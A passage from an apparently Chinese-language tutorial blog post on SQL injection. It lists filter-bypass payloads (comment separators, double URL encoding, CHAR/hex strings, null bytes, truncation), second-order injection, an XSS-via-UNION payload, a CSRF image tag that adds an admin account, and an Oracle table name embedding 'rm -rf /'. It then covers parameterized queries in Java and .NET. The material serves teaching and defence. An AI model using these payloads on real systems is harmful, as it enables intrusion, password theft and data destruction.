class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对关键字后面跟着的空格检测，使用/**/充当分隔符</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">'/**/UNION/**/SELECT/**/password/**/FROM/**/tblUsers/**/WHERE/**/username/**/LIKE/**/'</span>admin'<span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Mysql中能使用内联注释来避开关键字绕过，sel/**/ect</p>\n<h4 id=\"使用URL编码\"><a href=\"#使用URL编码\" class=\"headerlink\" title=\"使用URL编码\"></a>使用URL编码</h4><p>过滤器能过滤空白符和内联注释序列/*，将序列双URL编码，即对%编码得到%25</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'</span>admin'<span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>也能使用Unicode编码</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png\"></p>\n<h4 id=\"使用动态查询执行\"><a href=\"#使用动态查询执行\" class=\"headerlink\" title=\"使用动态查询执行\"></a>使用动态查询执行</h4><p>过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。</p>\n<ul>\n<li><p>mssql</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SELECT password FROM tblUsers'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>oracle</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> pw VARCHAR2<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE <span class=\"token string\">'SELECT password FROM tblUsers'</span> <span class=\"token keyword\">INTO</span> pw<span class=\"token punctuation\">;</span>\nDBMS_OUTPUT<span class=\"token punctuation\">.</span>PUT_LINE<span class=\"token punctuation\">(</span>pw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<p>使用字符串操作函数将过滤器允许的输入转换成一个包含所需查询的字符串</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Oracle: <span class=\"token string\">'SEL'</span><span class=\"token operator\">||</span><span class=\"token string\">'ECT'</span>\nMS<span class=\"token operator\">-</span><span class=\"token keyword\">SQL</span>: <span class=\"token string\">'SEL'</span><span class=\"token operator\">+</span><span class=\"token string\">'ECT'</span>\nMySQL: <span class=\"token string\">'SEL'</span> <span class=\"token string\">'ECT'</span>\n<span class=\"token comment\">#URL中分别将它们编码成％2b(+)和％20( )</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>oracle使用chr()，ms-sql使用char()，还能用来绕过引号</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">83</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">69</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">76</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">69</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">67</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">84</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>Oracle中的REVERSE、TRANSLATE、REPLACE 和SUBSTR函数。</p>\n<p>ms-sql，使用16进制实例化字符串</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@query</span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@query</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x53454c4543542070617373776f72642046524f4d2074626c5573657273</span> <span class=\"token keyword\">EXEC</span><span class=\"token punctuation\">(</span><span class=\"token variable\">@query</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"使用空字节\"><a href=\"#使用空字节\" class=\"headerlink\" title=\"使用空字节\"></a>使用空字节</h4><p>空字节之所以能起作用，是因为原生代码(native code)和托管代码分别采用不同的方法来处理空字节。在原生代码中，根据字符串起始位置到出现第一个空字节的位置来确定字符串长度 (空字节有效终止了字符串)。而在托管代码中，字符串对象包含一个字符数组(可能包含空字节) 和一条单独的字符串长度记录。</p>\n<p>要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节 (%00)即可。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">%</span><span class=\"token number\">00</span><span class=\"token string\">'UNION SELECT password FROM tblUsers WHERE username= '</span>admin'<span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"嵌套剥离后的表达式（双字绕过）\"><a href=\"#嵌套剥离后的表达式（双字绕过）\" class=\"headerlink\" title=\"嵌套剥离后的表达式（双字绕过）\"></a>嵌套剥离后的表达式（双字绕过）</h4><p>有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后再按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或多个字符，就不会递归应用过滤器。</p>\n<p>如果从输入中剥离了 SQL关键词SELECT</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">SELSELECTECT<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"利用截断\"><a href=\"#利用截断\" class=\"headerlink\" title=\"利用截断\"></a>利用截断</h4><p>审查过滤器通常会对用户提供的数据执行多种操作，有时这些操作中会包括将输入截断成最大的长度(可能是为了尽力阻止缓冲区溢出攻击)或者调整数据使其位于拥有预定义最大长度的数据库字段内。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#条件：对引号标记进行双重编码，使用两个单引号(\")替换所有的单引号(')，将每一项截断成16个字符</span>\n<span class=\"token keyword\">SELECT</span> uid <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'admin\"-- '</span><span class=\"token operator\">AND</span> password <span class=\"token operator\">=</span><span class=\"token string\">''</span>\n<span class=\"token comment\">#执行不成功</span>\n<span class=\"token comment\">#利用上述条件，注入15个a和一个单引号</span>\n<span class=\"token keyword\">SELECT</span> uid <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'aaaaaaaaaaaaaaa'' AND password =''\n#第三个单引号干扰了语法，后面无效\n'</span>\n<span class=\"token comment\">#利用第二个注入点闭合单引号，并注入永真条件</span>\n<span class=\"token keyword\">SELECT</span> uid <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> username <span class=\"token operator\">=</span> <span class=\"token string\">'aaaaaaaaaaaaaaa'' AND password = '</span><span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">-- '</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"避开自定义过滤器\"><a href=\"#避开自定义过滤器\" class=\"headerlink\" title=\"避开自定义过滤器\"></a>避开自定义过滤器</h4><p>遇到各种奇怪绝妙的输入过滤器，可以通过发挥想象力来避开这些过滤器。</p>\n<p>例如，包名加双引号，编码替换，加标签</p>\n<h4 id=\"使用非标准入口点\"><a href=\"#使用非标准入口点\" class=\"headerlink\" title=\"使用非标准入口点\"></a>使用非标准入口点</h4><p>通常WAF不会验证参数名，可以注入SQL代码到参数名中，如果参数名被处理成SQL查询就能执行，同理，也能注入到HTTP头中等等</p>\n<h3 id=\"利用二阶SQL注入\"><a href=\"#利用二阶SQL注入\" class=\"headerlink\" title=\"利用二阶SQL注入\"></a>利用二阶SQL注入</h3><ol>\n<li><p>攻击者在HTTP请求中提交某种经过构思的输入。</p>\n</li>\n<li><p>应用程序存储该输入(通常保存在数据库中)以便后面使用并响应请求。</p>\n</li>\n<li><p>攻击者提交第二个(不同的)请求。</p>\n</li>\n<li><p>为处理第二个请求，应用程序会检索己经存储的输入并处理，从而导致攻击者注入的 SQL查询被执行。</p>\n</li>\n<li><p>如果可行的话，会在应用程序对第二个请求的响应中向攻击者返回查询结果。</p>\n</li>\n</ol>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">a<span class=\"token string\">'+@@version+'</span>a\n<span class=\"token comment\">#注入这个参数值，经过处理得到</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> tblContacts <span class=\"token keyword\">VALUES</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'a''+@@version+''a'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'foo@example.org,....\n'</span>\n<span class=\"token comment\">#单引号被转化为双引号</span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> tblUsers <span class=\"token keyword\">WHERE</span> contactld <span class=\"token operator\">=</span> <span class=\"token number\">123</span>\n<span class=\"token comment\">#检索已存在的细节信息</span>\n<span class=\"token keyword\">UPDATE</span> tblUsers\n<span class=\"token keyword\">SET</span> name<span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token operator\">+</span>@<span class=\"token variable\">@version</span><span class=\"token operator\">+</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>address<span class=\"token operator\">=</span><span class=\"token string\">'52 Throwley Way'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token keyword\">WHERE</span> contactld <span class=\"token operator\">=</span> <span class=\"token number\">123</span>\n<span class=\"token comment\">#使用上面测试过的字符串注入引号双重编码</span>\n\n<span class=\"token comment\">#当查看更新后的信息时，@@version就会执行显示在屏幕</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"寻找二阶漏洞\"><a href=\"#寻找二阶漏洞\" class=\"headerlink\" title=\"寻找二阶漏洞\"></a>寻找二阶漏洞</h4><ol>\n<li><p>在筹划好应用程序的内容和功能后进行复查，寻找所有用户能够控制的数据项，这些数据项会被应用程序持久保存并被后面的功能重用。单独操作每个数据项并为每个实例执行接下来的步骤。</p>\n</li>\n<li><p>在数据项中提交一个简单的值，数据项在SQL查询中被不安全地使用时很可能会引发问题，例如，单引号或者使用单引号引起来的字母数字型字符串。如有必要，请快速检查所有包含多个阶段的过程（比如用户注册）以保证数据值完全持久地存在于应用程序中。</p>\n</li>\n<li><p>如果发现应用程序的输入过滤器阻止了输入，绕过</p>\n</li>\n<li><p>快速检查应用程序中所有存在显式使用数据项的功能以及可能存在隐式使用数据项的功能。寻找所有能够表明是由输入引发了问题的异常行为，比如数据库错误消息、HTTP 500 状态代码、更隐秘的错误消息、受损的功能、丢失或毁坏的数据等。</p>\n</li>\n<li><p>对于识别出来的每个潜在问题，尝试开发一种概念验证攻击来确认是否存在SQL注入漏洞。请注意，有缺陷的持久数据可能以间接受到攻击的方式（例如，整型转换错误或后续数据验证失败）来引发异常条件。使用两个引号标识来提供相同的输入并查看异常是否消失。 使用数据库专用的结构（比如字符串连接函数和版本标识）来确认正在修改SQL查询。如果异常条件是盲的（例如，不返回查询结果或任何错误消息），使用时间延迟技术来确认漏洞的存在。</p>\n</li>\n</ol>\n<h4 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h4><p>对所有可变数据项使用参数化，白名单</p>\n<h3 id=\"客户端SQL注入漏洞\"><a href=\"#客户端SQL注入漏洞\" class=\"headerlink\" title=\"客户端SQL注入漏洞\"></a>客户端SQL注入漏洞</h3><h4 id=\"访问本地数据库\"><a href=\"#访问本地数据库\" class=\"headerlink\" title=\"访问本地数据库\"></a>访问本地数据库</h4><p>为了更快的加载数据，以及离线使用，有时会把数据库放在本地</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//JavaScript创建一个本地数据库</span>\n<span class=\"token keyword\">var</span> database <span class=\"token operator\">=</span> <span class=\"token function\">openDatabase</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dbStatus\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1.0\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Status updates\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">500000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> db<span class=\"token punctuation\">.</span><span class=\"token function\">transaction</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">tx</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\ntx<span class=\"token punctuation\">.</span><span class=\"token function\">executeSql</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(IOO))\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ntx<span class=\"token punctuation\">.</span><span class=\"token function\">executeSql</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"INSERT INTO tblUpdates (date, user, status) VALUES ('1/8/2012','Me','I am writing a book.')\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"攻击客户端数据库\"><a href=\"#攻击客户端数据库\" class=\"headerlink\" title=\"攻击客户端数据库\"></a>攻击客户端数据库</h4><p>要发送客户端SQL注入攻击，攻击者必须识别出一些他能控制的数据片段，并且应用程序以非安全方式将这些数据片段存储在其他用户的客户端数据库中。</p>\n<p>如果这些客户端数据库存在同步，能到达其他数据库执行，则可以注入SQL查询</p>\n<p>场景</p>\n<p>在社交网络应用程序中，在Web邮件应用程序中，在实现拍卖功能的应用程序中，攻击者可以控制的基于文本的数据，在屏幕上输入的但是受到输入验证程序支配的数据</p>\n<h3 id=\"使用混合攻击\"><a href=\"#使用混合攻击\" class=\"headerlink\" title=\"使用混合攻击\"></a>使用混合攻击</h3><p>利用多种漏洞混合攻击</p>\n<h4 id=\"利用捕获的数据\"><a href=\"#利用捕获的数据\" class=\"headerlink\" title=\"利用捕获的数据\"></a>利用捕获的数据</h4><p>利用SQL注入读取权限，账户，口令</p>\n<h4 id=\"创建跨站脚本\"><a href=\"#创建跨站脚本\" class=\"headerlink\" title=\"创建跨站脚本\"></a>创建跨站脚本</h4><p>在SQL注入不能回显时，可以注入反射XSS来返回输出</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">https:<span class=\"token comment\">//www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,'&lt;script&gt;alert(1)&lt;/script&gt;',1</span>\n<span class=\"token comment\">#测试xss,如果没有过滤就会执行成功</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"在Oracle上运行操作系统命令\"><a href=\"#在Oracle上运行操作系统命令\" class=\"headerlink\" title=\"在Oracle上运行操作系统命令\"></a>在Oracle上运行操作系统命令</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token string\">\"!rm Rf/\"</span> <span class=\"token punctuation\">(</span>a varchar2 <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#该命令能被Oracle接受</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>如果DBA或开发人员使用带spool命令（DBA编写动态SQL脚本时经常使用的技术）的 SQL*Plus脚本，那么SQL*Plus会清除上述例子中的双引号以便访问该对象。接下来SQL*Plus 会将感叹号解析成主机命令（UNIX中是！，Windows和VMS中是$），并将感叹号后面的内容作为操作系统命令执行。</p>\n<p>下面是一个易受攻击的SQL*Plus脚本的例子。它创建了一个名为test.sql的spool文件， 之后执行该文件：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">SPOOL test.sql\nSELECT table_name FROM all_tables WHERE <span class=\"token assign-left variable\">owner</span><span class=\"token operator\">=</span><span class=\"token string\">'SCOTT'</span><span class=\"token punctuation\">;</span>\nSPOOL OFF\n@test.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"利用验证过的漏洞\"><a href=\"#利用验证过的漏洞\" class=\"headerlink\" title=\"利用验证过的漏洞\"></a>利用验证过的漏洞</h4><p>如果管理员在应用程序中完全可信，那么他们将能够直接在数据库中执行任意SQL查询。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">https:<span class=\"token comment\">//www.example.org/admin/ViewUser.aspx?UID=123</span>\n<span class=\"token comment\">#若UID是管理员,就可以直接利用管理员权限攻击</span>\n\n<span class=\"token comment\">#构造跨站伪造,诱导管理员帮助我们执行命令</span>\n<span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token string\">\" https://www.example.org/admin/ViewUser.aspx?UID=123;+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+('pablo','quest45th', true)\"</span><span class=\"token operator\">&gt;</span>\n<span class=\"token comment\">#若管理员点击图片就会帮我们创建一个新的管理员用户,这个用户我们能掌握。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"代码层防御\"><a href=\"#代码层防御\" class=\"headerlink\" title=\"代码层防御\"></a>代码层防御</h2><h3 id=\"领域驱动的安全\"><a href=\"#领域驱动的安全\" class=\"headerlink\" title=\"领域驱动的安全\"></a>领域驱动的安全</h3><p>领域驱动的安全(Domain Driven Security, DDS)是一种设计代码的方法，以这种方法设计的代码可以避免典型的注入问题</p>\n<p>领域驱动的安全是一种开发方法，它的目标是帮助开发人员进行推理并缓解任何类型的注入攻击的威胁——包括SQL注入和跨站脚本攻击。领域驱动的安全是开发人员为开发人员创建的理念，它的灵感来自于Eric Evans提出的领域驱动设计，它试图充分利用来自于DDD的概念以提高应用程序的安全性。</p>\n<p>简单来说，就是把所有过滤、处理的过程封装成一个类，将这个处理类放在输出到服务器之间，自动过滤</p>\n<p>当然，过滤不能完全处理，使用参数化语言也是明智选择，有时编码也能解决问题，但是考虑到不同数据库的处理不同，也会衍生相应问题</p>\n<h3 id=\"使用参数化语言\"><a href=\"#使用参数化语言\" class=\"headerlink\" title=\"使用参数化语言\"></a>使用参数化语言</h3><p>大多数现代编程语言和数据库访问API可以使用占位符或绑定变量来向SQL查询提供参数(而非直接对用户输入进行操作)。通常称之为参数化语句</p>\n<p>虽然它们不会修改传递给数据库的内容，但如果正在调用的数据库功能在存储过程或函数的实现中使用了动态SQL，那么仍然可能出现SQL注入。Microsoft SQL Server和Oracle长期受该问题的困扰，因为它们之前附带安装了很多内置的易受SQL注入攻击的存储过程。</p>\n<p>二次注入也可能实现</p>\n<p>并不是所有的SQL语句都可以参数化。特别是只能参数化数据值，而不能参数化SQL标识符或关键字。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">Username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span>\nPassword <span class=\"token operator\">=</span> request <span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">Sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM users WHERE username='\"</span> <span class=\"token operator\">+</span> Username <span class=\"token operator\">+</span> <span class=\"token string\">\"'AND password='\"</span><span class=\"token operator\">+</span>Password <span class=\"token operator\">+</span> <span class=\"token string\">\"'\"</span>\nResult <span class=\"token operator\">=</span> Db<span class=\"token punctuation\">.</span><span class=\"token keyword\">Execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">Sql</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">If</span> <span class=\"token punctuation\">(</span>Result<span class=\"token punctuation\">)</span> <span class=\"token comment\">/* successful login */</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这是一段易受攻击代码，下面将会对它参数化</p>\n<h4 id=\"Java中的参数化语句\"><a href=\"#Java中的参数化语句\" class=\"headerlink\" title=\"Java中的参数化语句\"></a>Java中的参数化语句</h4><p>Java提供了JDBC框架(在java.sql和javax.sql命名空间中实现)，作为独立于供应商的数据库访问方法。JDBC支持多种多样的数据库访问方法，包括通过PreparedStatement类来使用参数化语句。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">Connection</span> con <span class=\"token operator\">=</span> <span class=\"token class-name\">DriverManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConnection</span><span class=\"token punctuation\">(</span>connectionstring<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> sql <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM users WHERE username=? AND password=?\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token class-name\">PreparedStatement</span> lookupusers <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">prepareStatement</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//将参数添加到SQL查询中</span>\nlookupUser<span class=\"token punctuation\">.</span>setstring <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//在位置1添加字符串</span>\nlookupUser<span class=\"token punctuation\">.</span>setstring <span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//在位置2添加字符串</span>\nrs <span class=\"token operator\">=</span> lookupUser<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//添加参数时（通过使用不同的ser&lt;type&gt;函数，比如setString）指定了问号(?)占位符的编号位置（从1开始）</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在J2EE应用中，除了使用Java提供的JDBC框架外，通常还可以使用附加的包来高效地访问数据库。常用的访问数据库的持久化框架为Hibernate。</p>\n<p>除了可以使用固有的SQL功能和前面介绍的JDBC功能外，Hibernate还提供了自己的功能来将变量绑定到参数化语句。Query对象提供了使用命名参数(使用冒号指定，parameter) 或JDBC风格的问号占位符(?)的方法。</p>\n<p>下面的例子展示了如何使用带命名参数的Hibernate：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">string sql <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM users WHERE username=:username AND\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"password=:password\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Query</span> lookupUser <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">createQuery</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//将参数添加到SQL查询中</span>\nlookupUsers<span class=\"token punctuation\">.</span><span class=\"token function\">setstring</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 添加 username</span>\nlookupUsers<span class=\"token punctuation\">.</span><span class=\"token function\">setstring</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//添加 password</span>\n<span class=\"token class-name\">List</span> rs <span class=\"token operator\">=</span> lookupUser<span class=\"token punctuation\">.</span><span class=\"token function\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来的例子展示了如何在Hibernate的参数中，使用JDBC风格的问号占位符。请注意， Hibernate从0开始而不是像JDBC那样从1开始对参数进行编号。因此，列表中的第一个参数为0，第二个为1</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">string sql <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * FROM users WHERE username=? AND password=?\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Query</span> lookupUser <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">createQuery</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//将参数添加到SQL查询中</span>\nlookupUser<span class=\"token punctuation\">.</span><span class=\"token function\">setstring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//添加username</span>\nlookupUser<span class=\"token punctuation\">.</span><span class=\"token function\">setString</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//添加password</span>\n<span class=\"token class-name\">List</span> rs <span class=\"token operator\">=</span> lookupUser<span class=\"token punctuation\">.</span><span class=\"token function\">list</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"NET-C-中的参数化语句\"><a href=\"#NET-C-中的参数化语句\" class=\"headerlink\" title=\".NET(C#)中的参数化语句\"></a>.NET(C#)中的参数化语句</h4><p>Microsoft .NET提供了很多不同的访问方式，它们使用ADO.NET框架来参数化语句。ADO.NET还提供了附加的功能，可以进一步检查提供的参数，比如对提交的数据执行类型检查等。</p>\n<p>根据访问的数据库类型的不同，ADO.NET提供了4种不同的数据提供程序:用于Microsoft SQL Server 的 System.Data.SqlClient，用于 Oracle 数据库的 System.Data.OracleClient,以及分别用 于OLE 